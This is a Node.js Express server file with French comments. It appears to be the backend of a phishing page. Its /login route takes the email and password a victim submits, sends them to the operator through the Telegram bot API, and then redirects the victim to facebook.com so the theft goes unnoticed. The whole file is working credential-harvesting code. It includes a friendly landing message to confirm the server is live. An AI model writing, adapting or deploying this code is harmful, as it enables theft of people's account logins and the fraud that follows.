const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Configuration pour lire les données du formulaire
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Variables récupérées depuis Render (Environment Variables)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// --- PAGE D'ACCUEIL ---
// C'est ce bloc qui enlève le message "Cannot GET /"
app.get('/', (req, res) => {
    res.send('<h1>Le serveur de Summyah est en ligne et prêt !</h1><p>Ton bot Telegram fonctionne en arrière-plan.</p>');
});

// --- ROUTE DU FORMULAIRE ---
// C'est ici que ton formulaire envoie les infos (email et password)
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const message = `🔔 NOUVELLE CONNEXION\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
        
        try {
            // Envoi vers Telegram
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message
            });
            // Une fois envoyé, on peut rediriger l'utilisateur vers Facebook ou Google
            res.redirect('https://www.facebook.com');
        } catch (error) {
            console.error("Erreur Telegram:", error);
            res.status(500).send("Erreur lors de l'envoi du message.");
        }
    } else {
        res.status(400).send("Champs manquants.");
    }
});

// --- LANCEMENT DU SERVEUR ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});